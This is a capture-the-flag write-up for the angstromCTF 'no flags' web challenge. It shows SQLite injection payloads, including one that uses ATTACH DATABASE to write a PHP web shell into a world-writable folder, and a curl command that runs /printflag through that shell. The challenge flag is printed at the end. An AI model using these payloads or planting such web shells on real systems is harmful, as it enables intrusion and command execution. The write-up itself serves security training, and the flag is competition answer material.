#### Challenge:

After hearing about all of the cheating scandals, clam decided to conduct a sting operation for ångstromCTF. He made [a database of fake flags](https://no-flags.web.actf.co) to see who submits them. Unbeknownst to him, a spy managed to sneak a **real** flag into his database. Can you find it?

[Source](./index.php ":ignore"), [Dockerfile](./Dockerfile ":ignore")

---

#### Solution:

Investigating the given site, we found out that it contains `SQL injection` in  SQLite DB. After digging around and trying stuff like:

```sql
START'); INSERT INTO Flags SELECT name FROM sqlite_master;  INSERT INTO Flags VALUES ('END
```

I figured there are `"no flags"` in the DB. Looking closer at the provided `Dockerfile` it turns out that there is a program `/printflag` that we have to somehow run. Another useful thing to notice is that `everyone` has write access to folder `/var/www/html/abyss`. Trying our some payloads out of this handy  repository ([SQL Injection payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)), I was able to create `reverse PHP shell`:

```sql
START'); ATTACH DATABASE '/var/www/html/abyss/myawesomeuniquephpfile.php' AS myawesomeuniquephpfile; CREATE TABLE myawesomeuniquephpfile.pwn (dataz text); INSERT INTO myawesomeuniquephpfile.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>'); INSERT INTO Flags VALUES ('END
```

Then simply using it to call the `printflag` program (allowing for binary output) gives the flag:

```bash
curl "https://no-flags.web.actf.co/abyss/myawesomeuniquephpfile.php?cmd=/printflag" --output -
```

---

<details><summary>FLAG:</summary>

```
actf{why_do_people_still_use_php}
```

</details>
<br/>
